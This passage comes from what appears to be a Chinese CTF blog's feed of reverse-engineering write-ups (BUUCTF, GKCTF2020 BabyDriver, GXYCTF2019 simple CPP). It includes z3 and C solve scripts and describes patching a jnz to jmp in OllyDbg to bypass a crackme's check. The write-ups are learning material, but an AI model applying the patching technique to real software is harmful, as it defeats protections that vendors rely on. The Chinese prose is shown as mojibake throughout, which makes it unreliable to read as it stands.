è¿›è¡Œæ“ä½œçš„éƒ¨åˆ†: base16è§£ç ã€‚<img src="/2020/04/23/BUUCTF/image-20201002155232483.png" alt="image-20201002155232483"></p><p>ä»ä¸Šé¢çš„å¯†ç çš„å¤„ç†ä¹Ÿå°±è¯´æ˜äº†æˆ‘ä»¬é€†å‡ºv5çš„å€¼åï¼Œç›´æ¥æŠŠæ¯ä¸ªæ•°æ®è½¬åŒ–ä¸ºå¯¹åº”çš„åå…­è¿›åˆ¶å³å¯ã€‚ã€‚ä½†å…¶å®æœ‰é—®é¢˜çš„ã€‚ã€‚ã€‚é‚£å°±æ˜¯é¢˜ç›®æ²¡æœ‰é™åˆ¶è¾“å…¥å­—ç¬¦åªæœ‰0-Fï¼ˆ0-fï¼‰ã€‚ã€‚ã€‚é¢˜ç›®é—®é¢˜ã€‚ã€‚</p><p>å¦å¤–2ä¸ªåè°ƒè¯•ï¼š<img src="/2020/04/23/BUUCTF/image-20201002155719326.png" alt="image-20201002155719326"></p><p>ç»™ä¸ªé¢˜ç›®æƒ³è¦çš„ç­”æ¡ˆå§ï¼ˆæˆ‘ä¹Ÿæ˜¯è¯•äº†äº›æ—¶é—´æ‰å‡ºæ¥ã€‚ã€‚ï¼‰ï¼šè¿™é‡Œå¤§å†™åˆä¸ºä»€ä¹ˆä¸è¡Œå‘¢ã€‚ã€‚é¢˜ç›®çš„å‘ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'dbappsec'</span></span><br><span class="line"><span class="comment">#name = 'welcomebeijing' </span></span><br><span class="line">a = [<span class="number">0x2A</span>, <span class="number">0xD7</span>, <span class="number">0x92</span>, <span class="number">0xE9</span>, <span class="number">0x53</span>, <span class="number">0xE2</span>, <span class="number">0xC4</span>, <span class="number">0xCD</span>]</span><br><span class="line">ans1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">ans1 += hex(ord(s[i]) ^ a[i])[<span class="number">2</span>:]</span><br><span class="line">print(ans1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#md5(4eb5f3992391a1ae)</span></span><br></pre></td></tr></table></figure><h2 id="GKCTF2020-BabyDriver"><a href="#GKCTF2020-BabyDriver" class="headerlink" title="[GKCTF2020]BabyDriver"></a>[GKCTF2020]BabyDriver</h2><p>æŒºæœ‰æ”¶è·çš„ä¸€ä¸ªé¢˜ã€‚æ˜¯é©±åŠ¨æ–‡ä»¶ï¼Œè¿™æ–¹é¢äº†è§£çš„å°‘äº†ã€‚</p><p>idaè½½å…¥åä»å­—ç¬¦ä¸²å¯ä»¥å¾ˆå¿«å®šä½åˆ°ä¸€ä¸ªå…³é”®å‡½æ•°ï¼šmazeé¢˜ã€‚<img src="/2020/04/23/BUUCTF/image-20201004113855969.png" alt="image-20201004113855969"></p><p>è¿™ä¸ªé¢˜çš„æ–°åœ¨<strong>ç”±é”®ç›˜è¿‡æ»¤é©±åŠ¨è·å–é”®ç›˜æ‰«æç æ¥æ§åˆ¶ä¸Šä¸‹å·¦å³</strong>ï¼Œåˆšå¼€å§‹çœ‹äº†å¾ˆä¹…ä¹Ÿæ˜¯å¾ˆæ‡µã€‚ã€‚<img src="/2020/04/23/BUUCTF/image-20201004114024464.png" alt="image-20201004114024464"></p><p>æœ€åè¿™ä¸ªé¢˜ä¸ä»¥å¾€åšçš„mazeé¢˜ä¸åŒçš„è¿˜æœ‰ï¼š<strong>é€šè¿‡ä¸€ç»´ä¸‹æ ‡æ¥è®¿é—®äºŒä½æ•°ç»„</strong>ã€‚</p><p>ä¸ªäººæ„Ÿè§‰æŒºå¥½ã€‚</p><h2 id="GXYCTF2019-simple-CPP"><a href="#GXYCTF2019-simple-CPP" class="headerlink" title="[GXYCTF2019]simple CPP"></a>[GXYCTF2019]simple CPP</h2><p>é¢˜ç›®é€»è¾‘ç®€å•ï¼ŒåŠ¨è°ƒçœ‹çš„æ›´æ¸…æ¥šã€‚å…³é”®ï¼Œä½¿ç”¨z3çº¦æŸæ±‚è§£ï¼Œç„¶åä¸€ä¸ªä½ç§»çš„æ“ä½œå­¦ä¹ ã€‚</p><p>å¯¹æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ç»è¿‡å¼‚æˆ–åå­˜å‚¨çš„å¤„ç†ï¼š<img src="/2020/04/23/BUUCTF/image-20201005182345476.png" alt="image-20201005182345476"></p><p>å¯¹æ•°æ®çš„å¤„ç†éƒ¨åˆ†ï¼š<img src="/2020/04/23/BUUCTF/image-20201005182420487.png" alt="image-20201005182420487"></p><p>ä¹‹å‰å­¦ä¹ äº†z3çº¦æŸæ±‚è§£å™¨çš„ä½¿ç”¨ï¼ˆå®è´¨æ˜¯angrç¬¦å·æ‰§è¡Œï¼‰ã€‚å› ä¸ºè¿™é‡Œå°±æ˜¯4ä¸ª64ä½æ•´å‹æ•°æ®åœ¨åšä¸€äº›è¿ç®—ï¼Œåº”è¯¥æ±‚è§£çš„å‡ºæ¥ã€‚å°è¯•ä½¿ç”¨z3æ±‚è§£ï¼šå¾—åˆ°ç»“æœã€‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">x, y, z, w = BitVecs(<span class="string">'x y z w'</span>, <span class="number">64</span>)</span><br><span class="line">v21 = z &amp; ~x</span><br><span class="line">s.add(v21 == <span class="number">1176889593874</span>)</span><br><span class="line">v22 = ~y</span><br><span class="line">v23 = z &amp; v22</span><br><span class="line">v16 = x</span><br><span class="line">v27 = z</span><br><span class="line">v20 = y &amp; x</span><br><span class="line">v26 = y</span><br><span class="line">v28 = v23 &amp; v16 | v27 &amp; (v20 | v26 &amp; ~v16 | ~(v26 | v16))</span><br><span class="line">s.add(v28 == <span class="number">577031497978884115</span>)</span><br><span class="line">v24 = x &amp; v22</span><br><span class="line">v25 = v21 | v20 | v23 | v24</span><br><span class="line">s.add(v25 == <span class="number">4483974544037412639</span>)</span><br><span class="line">s.add(v25 ^ w == <span class="number">4483974543195470111</span>)</span><br><span class="line">s.add((v21 | v20 | v26 &amp; v27) != (~v16 &amp; v27 | <span class="number">0xC00020130082C0C</span>))</span><br><span class="line">s.add(y &gt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">ans = s.model()</span><br><span class="line">    print(ans)</span><br><span class="line"><span class="comment">#for i in ans:</span></span><br><span class="line"><span class="comment">#print('%s = 0x%x'%(i, ans[i].as_long()))</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">'error'</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#[w = 842073600,</span></span><br><span class="line"><span class="comment"># z = 577031497978884115,</span></span><br><span class="line"><span class="comment"># y = 68719476736,</span></span><br><span class="line"><span class="comment"># x = 4483973367147818765]</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è¿˜åŸä¹‹å‰çš„ä½æ“ä½œå’Œå¼‚æˆ–æ“ä½œäº†ï¼Œè¿™ä¸ªå¯¹Cè¯­è¨€æ¯”è¾ƒç†Ÿæ‚‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"i_will_check_is_debug_or_not"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">7</span>, z = <span class="number">0</span>, w = <span class="number">0</span>;</span><br><span class="line">_int64 a[<span class="number">4</span>] = &#123;<span class="number">0x3e3a460533286f0d</span>, <span class="number">0x1000000000</span>, <span class="number">0x8020717153e3013</span>, <span class="number">0x32310600</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = k; j &gt;= z; j--)</span><br><span class="line">&#123;</span><br><span class="line">flag[j] = ((<span class="keyword">char</span> *)(a+i))[w++];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(i != <span class="number">2</span>)</span><br><span class="line">k += <span class="number">8</span>, z += <span class="number">8</span>, w = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">k += <span class="number">4</span>, z += <span class="number">8</span>, w = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">8</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"e!P0or_a"</span>); <span class="comment">//å¤šè§£ï¼Œæ¯”èµ›æ—¶å•ç‹¬ç»™å‡ºçš„ã€‚</span></span><br><span class="line"><span class="keyword">if</span>(i &lt;= <span class="number">7</span> || i &gt;= <span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, flag[i]^s[i%<span class="number">27</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//We1l_D0ne!P0or_algebra_am_i</span></span><br></pre></td></tr></table></figure><p>ç”±äºå¼€å§‹å¾—åˆ°çš„flagå§‹ç»ˆä¸å¯¹ï¼Œç„¶åç™¾åº¦äº†ä¸‹ï¼Œå‘ç°æ˜¯ç¬¬äºŒéƒ¨åˆ†çš„æ•°æ®æ˜¯å¤šè§£ï¼Œè€Œæ¯”èµ›æ—¶å•ç‹¬ç»™å‡ºäº†ç¬¬äºŒéƒ¨åˆ†çš„æ­£ç¡®ç»“æœï¼Œæ‰€ä»¥æˆ‘ä¸Šé¢çš„Cè¯­è¨€ä»£ç ä¹Ÿæ˜¯ä¿®æ”¹è¿‡çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é€†å‘ç»ƒä¹ </title>
      <link href="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/"/>
      <url>/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>åˆšåˆšæ¥è§¦ä¿¡æ¯å®‰å…¨ï¼Œä»å¼€å§‹åœ¨æ”»é˜²ä¸–ç•Œåˆ·é¢˜çš„éƒ¨åˆ†è®°å½•ã€‚<a id="more"></a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>èœç‹—æˆªè·äº†ä¸€ä»½æŠ¥æ–‡å¦‚ä¸‹</p><p>ä»æŠ¥æ–‡ä¸­å¯ä»¥è”æƒ³åˆ°æ˜¯md5åŠ å¯†ï¼Œä½†è¯•äº†ä¸€ä¸‹, å‘ç°ä¸å¯¹ã€‚ å†çœ‹æŠ¥æ–‡ä¸­å­—æ¯åªæ˜¯ a-f ï¼Œæ‰€ä»¥å¯èƒ½æ˜¯åå…­è¿›åˆ¶æ•°ï¼Œåˆä¸€èˆ¬éƒ½æ˜¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—ç¬¦ï¼Œ è€Œä¸€ä¸ªå­—èŠ‚å­˜æ”¾äºŒä¸ªåå…­è¿›åˆ¶æ•°ã€‚æˆ‘ä»¬å°±2ä¸ªä¸€ç»„è½¬æ¢æˆåè¿›åˆ¶ï¼Œä½†æ˜¯å¤§äºäº†127ï¼Œ å¯æ‰“å°å­—ç¬¦ASCIIèŒƒå›´åœ¨<strong>0-127</strong>ï¼Œ é‚£æˆ‘ä»¬çŸ¥é“ <code>}</code>å­—ç¬¦çš„ASCIIåå…­è¿›åˆ¶ä¸º <strong>0X7D</strong>ï¼Œå†çœ‹æŠ¥æ–‡æœ€å2ä¸ªå­—ç¬¦ç»„æˆçš„åå…­è¿›åˆ¶æ•° <strong>0xf2</strong>ï¼Œä¸€èˆ¬æˆ‘ä»¬å¯ä»¥æœ‰è¿™ä¸ªæ€è·¯ï¼Œæ±‚å·®å€¼ï¼Œä½†ä¹Ÿæœ‰æœ€åæ²¡æœ‰ç”¨ <strong>}</strong>ç»“å°¾çš„ï¼Œè¿™é‡Œå°±ä¸æ˜¯ã€‚ä½†å…¶å®æƒ³åˆ°è¦æŠŠå­—ç¬¦æ‰“å°å‡ºæ¥, è€Œå­—ç¬¦ASCII<strong>0-127</strong>ï¼Œé‚£å°±ç›´æ¥è¯•ä¸€è¯•å‡128ï¼Œä¸€ä¸‹å­å°±å¯¹äº†ï¼Œå“ˆã€‚</p><p>ä¸‹é¢æ˜¯Cè¯­è¨€å†™çš„ï¼Œ2ä¸ªä¸€ç»„è½¬æ¢æˆåè¿›åˆ¶æ•°, æœ€åå˜æˆå¯æ‰“å°å­—ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, lenth  = <span class="built_in">strlen</span>(a), sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt;= <span class="number">97</span> &amp;&amp; a[i] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i] &gt;= <span class="number">65</span> &amp;&amp; a[i] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] -= <span class="number">48</span>; </span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">97</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">65</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">48</span>;</span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i+<span class="number">1</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(sum &gt; <span class="number">127</span>)</span><br><span class="line">sum -= <span class="number">128</span>;</span><br><span class="line"></span><br><span class="line">b[j++] = sum, sum = <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h3><p>é¦–å…ˆæ‹¿åˆ°é¢˜, è¿˜æ˜¯æ‹–è¿›<strong>Exeinfope</strong>æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦æœ‰å£³:</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200409121215784-1590549058520-1591952582454.png" alt="image-20200409121215784-1590549058520"></p><p>å—¯æ²¡æœ‰.</p><p>æ‹–è¿›ida, æ‰¾åˆ°ä¸»å‡½æ•°, æµè§ˆä¸€ä¸‹ç¨‹åºåŠŸèƒ½, ä¸€ä¸ªæ¸¸æˆ, å¥½åƒæ˜¯é€šè¿‡ç‚¹äº®æ‰€æœ‰ç¯è·å¾—flag. é‚£ä¹ˆå¿…å®šæœ‰ä¸€ä¸ªåˆ¤æ–­æ¡ä»¶, å¾€ä¸‹çœ‹ä¸»å‡½æ•°, æ˜¾è€Œæ˜“è§:</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200409121557118-1590549064830-1591952588146.png" alt="image-20200409121557118-1590549064830"></p><p>é‚£ä¹ˆä¸‹é¢ä¸€ä¸ªå‡½æ•°å°±æ˜¯å…³é”®å‡½æ•°äº†, è¿›å»å‘ç°å°±æ˜¯å°†flagè®¡ç®—å‡ºæ¥, 56ä½é•¿åº¦, è¿˜æ˜¯æ‡’å¾—è‡ªå·±å†™ç¨‹åºæ¥ç®—.</p><p>æˆ‘ä»¬å¯ä»¥åœ¨idaä¸­æ‰¾åˆ° <strong>åˆ¤æ–­æ¡ä»¶</strong>é‚£é‡Œçš„çš„åœ°å€,: 0045F5D1</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200409122019635-1590549068676-1591952593224.png" alt="image-20200409122019635-1590549068676"></p><p>å†é€šè¿‡OD,çœ‹åŠ è½½çš„ VA(è™šæ‹Ÿå†…å­˜åœ°å€) :</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200409203440087-1590549086887-1591952596805.png" alt="image-20200409203440087-1590549086887"></p><p>é‚£ä¹ˆç”±äº åŠ¨æ€å’Œé™æ€çš„VAå¯èƒ½ä¸åŒï¼Œä½†æ˜¯å®ƒä»¬çš„RVAè¿˜æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬ä½¿ç”¨åœ¨idaä¸­çš„æ‰¾åˆ°VA - imagebase = RVA. å†åŠ ä¸ŠODä¸­çš„VA, å³å¾—åˆ°åœ¨ODä¸­çš„åœ°å€: 0091F5D1. è¿™æ ·æˆ‘ä»¬ç›´æ¥åœ¨ODä¸­æ‰¾åˆ°è¿™ä¸ªåœ°å€: å¦‚ä¸‹å›¾, çœ‹åˆ°å¾ˆå¤š jnz. æ‰€ä»¥æˆ‘ä»¬çš„ç›®çš„æ˜¯è®©å®ƒéƒ½ä¸è·³è½¬, å¯ä»¥æ¯ä¸ªåœ°æ–¹éƒ½ nopäº†, ä½†æˆ‘ä»¬å¯ä»¥å¾€ä¸‹çœ‹, ç›´æ¥æ‰¾åˆ°å®ƒæœ€ååº”è¯¥å»åˆ°çš„å‡½æ•°åœ°å€(è®°ä¸ºA), é€šè¿‡æ‰“è¡¥ä¸æŠŠjnz xxxx, (å›¾ä¸­0091F5D8) æ”¹ä¸º jmp A.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200409204018803-1590549093480-1591952609729.png" alt="image-20200409204018803-1590549093480"></p><p>æœ€åä¸€æŒ‰ F9  è¿è¡Œ, å‡ºç°  flag  .</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200409204652301-1590549096561-1591952613467.png" alt="image-20200409204652301-1590549096561"></p><h3 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h3><p>æ‹¿åˆ°é¢˜æ˜¯Cæºç , ç›´æ¥åˆ†æå°±å¥½äº†, æ‰¾åˆ°ä¸»å‡½æ•°çœ‹ä¸€ä¸‹. æ˜ç¡®ç›®æ ‡, è¾“å…¥å­—ç¬¦ä¸², ä¹Ÿå°±æ˜¯flag, è¿›è¡Œä¸€ç³»åˆ—æ“ä½œå’ŒæŒ‡å®šå­—ç¬¦ä¸²æ¯”è¾ƒ. æ‰¾åˆ°æ¯”è¾ƒçš„åœ°æ–¹å¾ˆå®¹æ˜“æ¨å‡º:è¿™é‡Œresult  == 0;</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415170640341-1590549110220-1591952617886.png" alt="image-20200415170640341-1590549110220"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ä¸‹é¢å‡½æ•°çš„å¼‚æˆ–è¿ç®—ç»“æœä¸º0, é‚£ä¹ˆå³å‘ç”Ÿå¼‚æˆ–è¿ç®—çš„2ä¸ªæ•°ç›¸ç­‰.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415170736593-1590549112522-1591952621317.png" alt="image-20200415170736593-1590549112522"></p><p>æœ€åå°±æ˜¯éšæœºæ•°çš„é€‰å–äº†, æˆ‘ä»¬çŸ¥é“å®ƒæ˜¯ &lt;= 64çš„, é‚£ä¹ˆå†™ä¸€ä¸ªCç¨‹åº, æŠŠæ‰€æœ‰ç»“æœæ‰“å°å‡ºæ¥, æ‰¾åˆ°ç¬¦åˆçš„å³å¯.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415171038960-1590549115097-1591952634770.png" alt="image-20200415171038960-1590549115097"></p><p>æœ€åä»è¿™é“é¢˜, çŸ¥é“äº†, 1.<code>pthread_t</code>æ˜¯<code>unsigned long</code>å®å®šä¹‰çš„, 8ä¸ªå­—èŠ‚æ•´å‹æ•°æ®.2.<code>rand()%m</code>ä¹Ÿæ˜¯<code>random(m)</code>å®å®šä¹‰çš„.  </p><h3 id="secret-galaxy-300"><a href="#secret-galaxy-300" class="headerlink" title="secret-galaxy-300"></a>secret-galaxy-300</h3><p>é¦–å…ˆé¢˜ä¸‹è½½ä¸‹æ¥, å‘ç°å‡†å¤‡äº†3ä¸ªä¸åŒçš„ç‰ˆæœ¬, å°±åˆ†æå¸¸è§çš„PEæ–‡ä»¶.  æƒ³å…ˆæ‰“å¼€.exeæ–‡ä»¶, ä½†æ˜¯é—ªä¸€ä¸‹å°±é€€å‡ºäº†, æ ¹æœ¬çœ‹ä¸åˆ°ç¨‹åºæ˜¯åšä»€ä¹ˆçš„.</p><p>é¦–å…ˆæŸ¥å£³, å‘ç°æ— å£³.ğŸ˜ å…ˆç”¨idaæ‰“å¼€, æ‰¾åˆ°mainå‡½æ•°.å‘ç°æ˜¯ä»å·²ç»ç¼–ç çš„å­—ç¬¦ä¸²å–å‡ºæ¥, åœ¨æ‰“å°åœ¨å±å¹•ä¸Š. è½½å…¥OD, ä¸‹æ–­ç‚¹, çœ‹åˆ°åº•æ‰“å°äº†ä»€ä¹ˆ:  åˆ—å‡ºå‡ ä¸ªé“¶æ²³; æ˜¯å¦æ˜¯æœ‰ç”Ÿç‰©å­˜åœ¨; å®ƒä»¬è·ç¦»åœ°çƒçš„è·ç¦». ä½†è¿™ä¸ªå’Œflagæœ‰ä»€ä¹ˆå…³ç³»å‘¢.ğŸ˜¢. æƒ³ä¸åˆ°è”ç³», å›åˆ°idaä¸­å†çœ‹çœ‹. </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415192448626-1590549120154-1591952639860.png" alt="image-20200415192448626-1590549120154"></p><p>å‘ç°å·²ç»ç¼–ç çš„å­—ç¬¦æœ‰ä¸€ä¸ªæ²¡è¢«æ‰“å°å‡ºæ¥. å°± ctrl + x, çœ‹å“ªé‡Œè°ƒç”¨äº†å®ƒ, è·Ÿè¿›å».</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415193002493-1590549136439-1591952646896.png" alt="image-20200415193002493-1590549136439"></p><p>å‘ç°éƒ½æ˜¯èµ‹å€¼æ“ä½œ, ä¸”æœ€åä¸€ä¸ªèµ‹å€¼0, å¾ˆå¯èƒ½æ˜¯ flag çš„å­—ç¬¦ä¸².è®°å½•å¼€å§‹å’Œç»“æŸçš„åœ°å€, å» OD ä¸­åŠ¨æ€è°ƒè¯•.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415193726368-1590549141490-1591952651993.png" alt="image-20200415193726368-1590549141490"></p><p>ODä¸­åœ¨2ä¸ªåœ°å€, ä¸‹æ–­ç‚¹, å¹¶åœ¨å¼€å§‹è®°å½•ä¸‹èµ‹å€¼å­˜æ”¾æ•°æ®çš„åœ°å€, æŠŠå®ƒåœ¨æ•°æ®çª—å£ä¸­è·Ÿéš. F9æ‰§è¡Œå‡ºç°å­—ç¬¦ä¸².</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200415194242898-1590549138934-1591952658378.png" alt="image-20200415194242898-1590549138934"></p><p>å¿ƒå¾—: æ³¨æ„æ–‡ä»¶ä¸­ç¼–ç äº†ä½†æ˜¯æ²¡æœ‰ä½¿ç”¨çš„å­—ç¬¦ä¸². </p><h3 id="Newbie-calculations"><a href="#Newbie-calculations" class="headerlink" title="Newbie_calculations"></a>Newbie_calculations</h3><p>é¦–å…ˆä»é¢˜ç›®çœ‹å‡º, æ˜¯æ–°æ‰‹è®¡ç®—, æƒ³åˆ°åº”è¯¥å’Œè®¡ç®—æœ‰å…³çš„. </p><p>é¢˜ç›®ä¸‹è½½ä¸‹æ¥, æ‰“å¼€å, åªæ˜¯æ‰“å°  <strong>Your flag is:</strong> ,å°±å¡ä½äº†, ä¹Ÿæ²¡æœ‰è®©è¾“å…¥ä¿¡æ¯. åœ¨è‡ªå·±å†™Cç¨‹åºä¹Ÿé‡åˆ°è¿‡è¿™ç§é—®é¢˜, 